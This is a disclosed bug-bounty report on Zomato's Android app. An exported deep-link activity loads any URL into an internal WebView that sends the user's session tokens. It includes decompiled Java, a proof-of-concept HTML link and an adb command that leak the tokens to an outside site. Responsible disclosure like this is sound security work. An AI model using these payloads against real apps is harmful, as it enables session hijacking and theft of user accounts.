# [Zomato Android/iOS] Theft of user session

## Report Details
- **Report ID**: 328486
- **URL**: https://hackerone.com/reports/328486
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2018-03-21T22:53:57.314Z
- **Disclosed**: 2018-06-17T17:34:37.074Z

## Reporter
- **Username**: bagipro
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
Hi, I'd like to report a bug which allows to theft user data even without installing third-party apps.

Activity 
```xml
        <activity android:theme="@style/ZomatoTranslucentTheme" android:label="@string/app_name" android:name="com.application.zomato.activities.DeepLinkRouter" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="zomato"/>
            </intent-filter>
        </activity>
```
is exported, and can be accessed by browser. When any WebView (in a client app, or a browser) meets a ``` zomato://etc ``` URL it will automatically launch Zomato app.

File ``` com/application/zomato/activities/DeepLinkRouter.java ```
```java
	        } else if (!(getIntent() == null || getIntent().getAction() == null || !"android.intent.action.VIEW".equals(getIntent().getAction()))) {
	            this.c = getIntent().getData().toString(); // getting zomato://etc URL
	        }
	        c(this.c);
```
```java
	    private void c(java.lang.String str) {
	        boolean z = false;
	        boolean z2 = true;
	        try {
	            android.net.Uri parse = android.net.Uri.parse(str);
	            if ("zomato".equals(parse.getScheme()) || "zomatodelivery".equals(parse.getScheme())) {
	                java.util.List pathSegments;
	                java.lang.String host = parse.getHost();
```
```java
	                                } else if ("treatswebview".equals(host)) {
	                                    e(parse); // url should look like zomato://treatswebview?url=
	                                }
```
```java
	    private void e(android.net.Uri uri) {
	        android.support.v4.app.TaskStackBuilder v = v();
	        java.lang.String a = com.zomato.a.b.g.a(uri.getQueryParameter("url")); // decode of the query parameter
	        java.lang.String str = "";
	        if (uri.getQueryParameter("navigation_bar_title") != null) {
	            str = com.zomato.a.b.g.a(uri.getQueryParameter("navigation_bar_title")); // page title
	        }
	        android.content.Intent intent = new android.content.Intent(this, com.library.zomato.ordering.utils.ZUtil.getClassForWebViewNavigationType(uri));
	        intent.putExtra("url", a);
	        intent.putExtra("title", str);
	        // starting TreatsWebViewActionBarActivity
```

File ``` com/library/zomato/ordering/webview/TreatsWebViewActionBarActivity.java ```
```java
	        android.os.Bundle extras = getIntent().getExtras();
	        if (extras != null) {
	            if (extras.containsKey("url")) {
	                this.mUrl = extras.getString("url"); // 
	            }
```
```java
	    public void loadWebView() {
	        if (!this.hasLoadedBefore && !com.zomato.a.b.g.a(this.mWebViewURL)) {
	            this.zomatoWebView.loadUrl(this.mWebViewURL, this.httpHeaders); // mWebViewURL == mUrl
	            this.hasLoadedBefore = true;
	        }
	    }
```

PoC video is very simple:
{F277437}

Code on local server:
```html
<!DOCTYPE html>
<html>
<head><title>Zaheck page</title></head>
<body style="text-align: center;">
	<h1><a href="zomato://treatswebview/?url=http://google.com&navigation_bar_title=wow">Begin zaheck!</a></h1>
</body>
</html>
```

All tokens were sent to Google page:
{F277440}

Third-party apps can also attack your app, PoC from ADB:
```
adb shell am start -n com.application.zomato/.activities.DeepLinkRouter -a android.intent.action.VIEW -d "zomato://treatswebview/?url=http://google.com&navigation_bar_title=wow"
```

Hopefully in this case the latest app, but not 2 year old build :)

## Impact

1) Leakage of user tokens to arbitrary sites
2) XSS/Ability of open arbitrary sites in your internal WebView

## Attachments
No attachments
